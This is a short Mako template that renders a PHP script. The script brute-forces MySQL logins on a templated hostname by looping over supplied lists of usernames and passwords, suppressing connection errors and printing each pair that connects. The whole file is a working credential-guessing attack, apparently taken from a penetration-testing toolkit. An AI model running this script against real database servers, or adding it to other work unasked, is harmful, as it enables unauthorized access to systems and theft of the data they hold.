<%! import json %>

ini_set('mysql.connect_timeout',1);
$users=array (
    % for u in users:
    ${ json.dumps(u) },
    % endfor
);
$pwds=array (
    % for p in pwds:
    ${ json.dumps(p) },
    % endfor
);

foreach($users as $u) {
    foreach($pwds as $p) {
        $c=@mysqli_connect("${ hostname }", "$u", "$p");
        if($c){
            print("$u:$p".PHP_EOL);
            break;
        }
    }
}mysqli_close();
